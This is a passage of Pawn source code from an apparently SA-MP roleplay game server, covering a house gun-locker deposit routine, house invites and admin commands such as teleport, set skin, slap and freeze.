				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				OnPlayerStatsUpdate(playerid);
				return 1;
			}
			else { SendClientMessage(playerid,COLOR_GREY,"   Invalid weapon name!"); return 1; }
		}
	}

	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID)
		{
			if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
			{
				format(string, sizeof(string), "   You must wait %d seconds before depositing another weapon.", GetPVarInt(playerid, "GiveWeaponTimer"));
				SendClientMessage(playerid,COLOR_GREY,string);
				return 1;
			}
			new maxslots = HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade];
			if(slot > maxslots)
			{
				SendClientMessage(playerid, COLOR_GREY, "Invalid slot.");
				return 1;
			}

			if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] != 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "You have a weapon stored in that slot already.");
				return 1;
			}

			new weapon;
			if(strcmp(weaponchoice, "sdpistol", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][2] == 23 && PlayerInfo[playerid][pAGuns][2] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a silenced pistol into your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][2];
					format(string,sizeof(string), "* %s deposited their silenced pistol in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "deagle", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][2] == 24 && PlayerInfo[playerid][pAGuns][2] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a Desert Eagle in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][2];
					format(string,sizeof(string), "* %s deposited their Desert Eagle in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "shotgun", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][3] == 25 && PlayerInfo[playerid][pAGuns][3] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a shotgun in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][3];
					format(string,sizeof(string), "* %s deposited their Shotgun in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "spas12", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][3] == 27 && PlayerInfo[playerid][pAGuns][3] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a combat shotgun in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][3];
					format(string,sizeof(string), "* %s deposited their Combat Shotgun in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "mp5", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an MP5 in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s deposited their MP5 in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "ak47", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][5] == 30 && PlayerInfo[playerid][pAGuns][5] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an AK-47 in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][5];
					format(string,sizeof(string), "* %s deposited their AK-47 in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "m4", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][5] == 31 && PlayerInfo[playerid][pAGuns][5] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an M4 in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][5];
					format(string,sizeof(string), "* %s deposited their M4 in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "rifle", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][6] == 33 && PlayerInfo[playerid][pAGuns][6] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a rifle in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][6];
					format(string,sizeof(string), "* %s deposited their riflein their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "sniper", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][6] == 34 && PlayerInfo[playerid][pAGuns][6] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a sniper rifle in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][6];
					format(string,sizeof(string), "* %s deposited their sniper rifle in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "uzi", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 28 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an uzi in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s deposited their uzi in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			else if(strcmp(weaponchoice, "tec9", true, strlen(weaponchoice)) == 0)
			{
				if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
				{
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a tec9 in your gun locker.");
					weapon = PlayerInfo[playerid][pGuns][4];
					format(string,sizeof(string), "* %s deposited their tec9 in their house safe.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
				}
			}
			if(weapon == 0) return SendClientMessage(playerid, COLOR_GREY, "You don't have that weapon.");
			if(HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] == 0)
			{
				HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][slot-1] = weapon;
				RemovePlayerWeapon(playerid, weapon);
				SaveHouses();
				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				OnPlayerStatsUpdate(playerid);
				return 1;
			}
			else { SendClientMessage(playerid,COLOR_GREY,"   Invalid weapon name!"); return 1; }
		}
	}

	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You're not in any house");
	}
	return 1;
}

CMD:home(playerid, params[])
{
    if(CheckPointCheck(playerid))
	{
        SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
        return 1;
    }
    if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
	{
        SetPlayerCheckpoint(playerid,HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorX], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorY], HouseInfo[PlayerInfo[playerid][pHouse]][hExteriorZ], 4.0);
        GameTextForPlayer(playerid, "~w~Waypoint set ~r~Home", 5000, 1);
        gPlayerCheckpointStatus[playerid] = CHECKPOINT_HOME;
    }
    else
	{
        GameTextForPlayer(playerid, "~w~You're homeless", 5000, 1);
    }
    return 1;
}

CMD:houseinvite(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "You don't own a house.");

	new
		giveplayerid,
		houseid;

	if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID || PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID) {
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /houseinvite [playerid/partofname]");

		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't /houseinvite yourself!");

		if(giveplayerid != INVALID_PLAYER_ID) {
			new string[59 + MAX_PLAYER_NAME];
			if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID) hInviteHouse[giveplayerid] = PlayerInfo[playerid][pHouse];
			else hInviteHouse[giveplayerid] = PlayerInfo[playerid][pHouse2];
			hInviteOffer[giveplayerid] = playerid;
			format(string, sizeof(string), "   %s has invited you to their house (type /accept invite).", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "   You have invited %s to your house.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		} else return SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
	} else {
		if(sscanf(params, "ui", giveplayerid, houseid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /houseinvite [playerid/partofname] [house 1/2]");

		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't /houseinvite yourself!");

		if(giveplayerid != INVALID_PLAYER_ID) {
			new string[59 + MAX_PLAYER_NAME];
			if(houseid == 1) hInviteHouse[giveplayerid] = PlayerInfo[playerid][pHouse];
			else if(houseid == 2) hInviteHouse[giveplayerid] = PlayerInfo[playerid][pHouse2];
			else return SendClientMessage(playerid, COLOR_GRAD2, "Invalid house specified.");
			hInviteOffer[giveplayerid] = playerid;
			format(string, sizeof(string), "   %s has invited you to their house (type /accept invite).", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "   You have invited %s to your house.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		} else return SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
	}
	return 1;
}

CMD:setvw(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid, vw;
		if(sscanf(params, "ud", giveplayerid, vw)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setvw [playerid/partofname] [virtual world]");

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pVW] =  vw;
			SetPlayerVirtualWorld(giveplayerid,  vw);
			format(string, sizeof(string), "You have set %s's virtual world to %d.", GetPlayerNameEx(giveplayerid),  vw);
			SendClientMessage(playerid, COLOR_GRAD2, string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:setint(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], giveplayerid, int;
		if(sscanf(params, "ud", giveplayerid, int)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setint [playerid/partofname] [interiorid]");

		if(IsPlayerConnected(giveplayerid))
		{
		    if(PlayerInfo[giveplayerid][pAdmin] <= PlayerInfo[playerid][pAdmin]) {
				PlayerInfo[giveplayerid][pInt] = int;
				SetPlayerInterior(giveplayerid, int);
				format(string, sizeof(string), "You have set %s's interior to %d.", GetPlayerNameEx(giveplayerid), int);
				SendClientMessage(playerid, COLOR_GRAD2, string);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "You can't execute this command on equal or higher level admins.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:setskin(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			string[128],
			giveplayerid,
			skinid;

		if(sscanf(params, "ud", giveplayerid, skinid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setskin [playerid/partofname] [skinid]");

		if(giveplayerid != INVALID_PLAYER_ID) {
			if(!IsInvalidSkin(skinid)) {
				if(GetPlayerSkin(giveplayerid) == skinid)
					return SendClientMessage(playerid, COLOR_WHITE, "That player is already wearing the skin you chose.");

			    if(AdminDuty[giveplayerid] == 0 || giveplayerid == playerid) {
					PlayerInfo[giveplayerid][pSkin] = skinid;
					format(string, sizeof(string), "Your skin has been changed to ID %d by Admin %s.", skinid, GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_WHITE, string);
					format(string, sizeof(string), "You have given %s skin ID %d.", GetPlayerNameEx(giveplayerid), skinid);
					SendClientMessage(playerid, COLOR_WHITE, string);
					SetPlayerSkin(giveplayerid, PlayerInfo[giveplayerid][pSkin]);
				} else return SendClientMessage(playerid, COLOR_GRAD1, "You can't set skins for on-duty admins, unless you're setting your own skin.");
			}
			else return SendClientMessage(playerid, COLOR_GREY, "Invalid skin ID!");
		}
	}
	else return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:gotoid(playerid, params[])
{
	new giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gotoid [playerid/partofname]");

	new Float:plocx,Float:plocy,Float:plocz;
	if(IsPlayerConnected(giveplayerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 2)
		{
			if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    	{
	        	SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
				return 1;
	    	}
			if(GetPlayerState(giveplayerid) == PLAYER_STATE_SPECTATING)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player is spectating someone.");
				return 1;
			}
			if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "You can't do this while spectating.");
				return 1;
			}
			GetPlayerPos(giveplayerid, plocx, plocy, plocz);
			Streamer_UpdateEx(playerid, plocx, plocy, plocz);

			if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid,plocx,plocy+2, plocz);
			}

			SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
			SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			new giveplayeridvw = GetPlayerVirtualWorld(giveplayerid);
			new giveplayerint =  GetPlayerInterior(giveplayerid);
			PlayerInfo[playerid][pVW] = giveplayeridvw;
			PlayerInfo[playerid][pInt] = giveplayerint;

			SendClientMessage(playerid, COLOR_WHITE, "You have been teleported!");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
		}

	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

CMD:gethere(playerid, params[]) {
	new
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gethere [playerid/partofname]");

	new
		Float:plocx,
		Float:plocy,
		Float:plocz;

	if(IsPlayerConnected(giveplayerid)) {
		if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't perform this action on an equal or higher level admin that is on-duty.");

		if(PlayerInfo[playerid][pAdmin] >= 2) {
			if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        	return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	    	if(GetPVarInt(giveplayerid,"MedicCall") == 1)
	    	    return SendClientMessage(playerid, COLOR_GREY, "That player is currently injured, you can teleport to them using /goto.");

			if(GetPlayerState(giveplayerid) == PLAYER_STATE_SPECTATING)
				return SendClientMessage(playerid, COLOR_GRAD2, "That player is spectating someone.");

			GetPlayerPos(playerid, plocx, plocy, plocz);
			Streamer_UpdateEx(giveplayerid, plocx, plocy, plocz);
			SetPVarInt(playerid, "BeingTeleported", 1);

			if(GetPlayerState(giveplayerid) == 2)
			{
				TelePos[giveplayerid][0] = 0.0;
				TelePos[giveplayerid][1] = 0.0;
				fVehSpeed[giveplayerid] = 0.0;
				new tmpcar = GetPlayerVehicleID(giveplayerid);
				SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
				LinkVehicleToInterior(GetPlayerVehicleID(giveplayerid), GetPlayerInterior(playerid));
				SetPlayerInterior(giveplayerid, GetPlayerInterior(playerid));
				SetVehicleVirtualWorld(GetPlayerVehicleID(giveplayerid), GetPlayerVirtualWorld(playerid));
				SetPlayerVirtualWorld(giveplayerid, GetPlayerVirtualWorld(playerid));
			}
			else
			{
				SetPlayerPos(giveplayerid,plocx,plocy+2, plocz);
			}

			SetPlayerInterior(giveplayerid, GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(giveplayerid, GetPlayerVirtualWorld(playerid));
			new playeridvw = GetPlayerVirtualWorld(playerid);
			new playerint =  GetPlayerInterior(playerid);
			PlayerInfo[giveplayerid][pVW] = playeridvw;
			PlayerInfo[giveplayerid][pInt] = playerint;

			SendClientMessage(giveplayerid, COLOR_WHITE, "You have been teleported!");
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
		}

	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

CMD:belt(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /belt [playerid/partofname]");

		if(!IsPlayerConnected(giveplayerid))
		    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

		if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
			return SendClientMessage(playerid,COLOR_WHITE, "You can't belt a higher admin.");

		new
			Float:shealth;

		GetPlayerHealth(giveplayerid, shealth);
		SetPlayerHealth(giveplayerid, shealth-5);
		GetPlayerPos(giveplayerid, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]);
		SetPlayerPos(giveplayerid, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]-5);
		PlayerPlaySound(giveplayerid, 1130, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]-5);
		format(string, sizeof(string), "AdmCmd: %s was belted by %s",GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
		ABroadCast(COLOR_LIGHTRED,string,1);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:slap(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /slap [playerid/partofname]");

		if(!IsPlayerConnected(giveplayerid))
		    return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

		if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
			return SendClientMessage(playerid,COLOR_WHITE, "You can't slap a higher admin.");

		new
			Float:shealth;

		GetPlayerHealth(giveplayerid, shealth);
		SetPlayerHealth(giveplayerid, shealth-5);
		GetPlayerPos(giveplayerid, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]);
		SetPlayerPos(giveplayerid, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]+5);
		PlayerPlaySound(giveplayerid, 1130, PlayerInfo[giveplayerid][pPos_x], PlayerInfo[giveplayerid][pPos_y], PlayerInfo[giveplayerid][pPos_z]+5);
		format(string, sizeof(string), "AdmCmd: %s was slapped by %s",GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid));
		ABroadCast(COLOR_LIGHTRED,string,1);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:freeze(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			string[128],
			giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /freeze [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
				return SendClientMessage(playerid, COLOR_GRAD2, "You can't freeze a higher admin.");

			TogglePlayerControllable(giveplayerid, 0);
			SetPVarInt(giveplayerid, "IsFrozen", 1);
			format(string, sizeof(string), "AdmCmd: %s was frozen by %s",GetPlayerNameEx(giveplayerid),GetPlayerNameEx(playerid));
			ABroadCast(COLOR_LIGHTRED,string,1);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

	return 1;
}

CMD:unfreeze(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /unfreeze [playerid/partofname]");


		if(IsPlayerConnected(giveplayerid))
		{
			DeletePVar(giveplayerid, "IsFrozen");
			TogglePlayerControllable(giveplayerid, 1);
			format(string, sizeof(string), "AdmCmd: %s was unfrozen by %s",GetPlayerNameEx(giveplayerid),GetPlayerNameEx(playerid));
			ABroadCast(COLOR_LIGHTRED,string,1);
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Invalid player specified.");
		}

	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:spec(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use that command!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}
	if(strcmp(params, "off", true) == 0)
	{
		if(Spectating[playerid] > 0 && PlayerInfo[playerid][pAdmin] >= 2)
		{
			GettingSpectated[Spectate[playerid]] = 999;
			Spectating[playerid] = 0;
			Spectate[playerid] = 999;
			SetPVarInt(playerid, "SpecOff", 1);
			TogglePlayerSpectating(playerid, false);
			SetCameraBehindPlayer(playerid);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not spectating anyone.");
			return 1;
		}
	}
	if(strcmp(params, "o", true) == 0)
	{
		if(Spectating[playerid] > 0 && PlayerInfo[playerid][pAdmin] >= 2)
		{
			GettingSpectated[Spectate[playerid]] = 999;
			Spectating[playerid] = 0;
			Spectate[playerid] = 999;
			SetPVarInt(playerid, "SpecOff", 1);
			TogglePlayerSpectating(playerid, false);
			SetCameraBehindPlayer(playerid);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not spectating anyone.");
			return 1;
		}
	}

	new giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /spec (player/off)");
	if(IsPlayerConnected(giveplayerid))
	{
		if(InsideTut[giveplayerid] >= 1)
		{
			SendClientMessage(playerid, COLOR_WHITE, "NOTE: This player is in the tutorial. Please consider this before assuming that they're air-breaking.");
		}
		if(GetPVarInt(giveplayerid, "PBM") > 0) SendClientMessage(playerid, COLOR_WHITE, "NOTE: This player is in paintball. Ensure they haven't stepped out of the boundaries before assuming they are airbreaking.");
		if(Spectating[playerid] == 0)
		{
			new Float: pPositions[3];
			GetPlayerPos(playerid, pPositions[0], pPositions[1], pPositions[2]);
			SetPVarFloat(playerid, "SpecPosX", pPositions[0]);
			SetPVarFloat(playerid, "SpecPosY", pPositions[1]);
			SetPVarFloat(playerid, "SpecPosZ", pPositions[2]);
			SetPVarInt(playerid, "SpecInt", GetPlayerInterior(playerid));
